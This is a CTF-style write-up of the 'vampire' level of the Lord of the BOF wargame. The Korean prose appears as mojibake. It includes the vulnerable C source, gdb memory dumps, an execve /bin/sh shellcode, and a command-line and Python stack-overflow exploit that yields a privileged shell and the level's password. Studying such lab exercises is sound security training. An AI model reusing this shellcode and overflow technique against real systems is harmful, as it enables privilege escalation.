---
title: "[LOB]Level09. vampire"
tags: [LOB, writeup]
author: eli_ez3r
key: 20180009
category: write-up
date: 2018-08-29 04:00:00 +0900
modify_date: 2024-04-26
article_header:
  type: cover
  image:
    src: /assets/img/hackerschool_logo.png
---

[Check 0xBFFF](#){:.button.button--outline-success.button--pill}
> troll / aspirin

-----

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/
#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

    // here is changed!
    if(argv[1][46] == '\xff')
    {
        printf("but it's not forever\n");
        exit(0);
    }

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

-----

### 0x01. Analysis

RET ì£¼ì†Œì˜ 2ë²ˆì§¸ ê°’ì´ '\xff'ì´ë©´ ì•ˆëœë‹¤..;;

ê·¸ì™¸ì—ëŠ” ë³„ê±° ì—†ë‹¤.

- buffer ë°°ì—´ í¬ê¸° 40byte
- RET ì²« 1byte '\xbf'ë¡œ ì‹œì‘
- **RET ë‘ë²ˆì§¸ 1byte '\xff' ê²€ì¦**
- strcpyë¥¼ ì´ìš©í•˜ì—¬ argv[1] ì¸ì ê°’ì„ buffer ë°°ì—´ë¡œ ë³µì‚¬

ìŠ¤íƒì—ì„œ ë²„í”„ì˜ ìœ„ì¹˜ê°€ 0xbfff ì˜ì—­ì— ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— í•„í„°ë§ì— ê±¸ë¦´ ìˆ˜ ë°–ì— ì—†ë‹¤.  
ì–´ë–»ê²Œí•˜ë©´ 0xbfffxxxx ì˜ì—­ì´ ì•„ë‹Œ ê³³ì— shellcodeë¥¼ ë„£ì„ê¹Œ ê³ ë¯¼ì„í•˜ë‹¤ê°€ ë¬´ì‹í•œ(?) ë°©ë²•ì„ ì•Œê²Œëë‹¤.  
**argv[2]ì˜ ë§ì€ ê°’ì˜ ë°ì´í„°ë¥¼ ë„£ì–´ì„œ ë²„í¼ì˜ ì£¼ì†Œê°€ 0xbfffì˜ì—­ì„ ë²—ì–´ë‚˜ê²Œ ë§Œë“¤ë©´ëœë‹¤.** ğŸ˜…

<br>

í™•ì¸í•´ë³´ì.

```shell
[troll@localhost troll]$ ./aampire `python -c 'print "\x90"*44+"\xff\xff\xbf\xbf"'` `python -c 'print "\x90"*70000'`

ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ï£·ï£·ì˜œ
Segmentation fault (core dumped)
```

```shell
[troll@localhost troll]$ gdb -c core -q
Core was generated by `./aampire ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ï£·ï£·ì˜œ ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfffff in ?? ()
(gdb) x/4x $esp
0xbffeeb50:     0x00000000      0xbffeeb94      0xbffeeba4      0x40013868
```

argv[2]ì— NULLê°’ì„ 70000ê°œ ë„£ì—ˆë”ë‹ˆ espê°’ì´ 0xbffexxxx ì˜ì—­ì„ ê°€ë¦¬í‚¤ê³  ìˆëŠ” ê²ƒì„ í™•ì¸í•˜ì˜€ë‹¤.



```
(gdb) x/100x $esp
=====================================(ìƒëµ)================================
0xbffeec80:     0x00000000      0x38366900      0x2f2e0036      0x706d6161
0xbffeec90:     0x00657269      0x90909090      0x90909090      0x90909090
0xbffeeca0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffeecb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffeecc0:     0xbfbfffff      0x90909000      0x90909090      0x90909090
0xbffeecd0:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb)
```

ê·¸ë¦¬ê³  ì‹¤ì œ Shell Codeê°€ ì˜¬ë¼ê°€ëŠ” ì£¼ì†ŒëŠ” `0xbffeeca0` ê·¼ì²˜ ì¸ê²ƒë„ í™•ì¸í•˜ì˜€ë‹¤.

-----

### 0x02. Exploit

```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

```shell
[troll@localhost troll]$ ./vampire `python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\xa0\xec\xfe\xbf"'` `python -c 'print "\x90"*70000'`
ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±1í”h//shh/binë¥PSë£ì†»
                                         ?ì¢î¼
bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
bash$ my-pass
euid = 509
music world
```

-----

### 0x03. ì •ë¦¬

RET ì£¼ì†Œ ê°’ì´ `0xbfff~` ë¡œ ì‹œì‘í•˜ëŠ” ì£¼ì†Œì´ë©´ ë™ì‘í•˜ì§€ ì•Šë„ë¡ ë¡œì§ì´ ì¶”ê°€ë˜ì—ˆê³ ,  
shellcodeë¥¼ `0xbfff~` ì£¼ì†Œê°€ ì•„ë‹Œ ë‹¤ë¥¸ ê³³ì— ë„£ê¸°ìœ„í•´ argv[2]ì— ë§ì€ ì“°ë ˆê¸° ê°’ì„ ë„£ì–´ `0xbffe~` ì£¼ì†Œì— shellcodeê°€ ì˜¬ë¼ê°€ê²Œë” ìš°íšŒí•˜ì˜€ë‹¤.

-----
```python
import os
import struct

append = lambda x, y: x + y
p32 = lambda x: struct.pack("<I", x)

target = "/home/troll/vampire"

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
shellcode_addr = 0xbffeeca0

payload1 = "\x90"*20
payload1 = append(payload1, shellcode)
payload1 = append(payload1, p32(shellcode_addr))

payload2 = "\x90"*70000

pid = os.fork()

if pid == 0:
        os.execv(target, (target, payload1, payload2))
else:
        os.waitpid(pid, 0)
```

-----

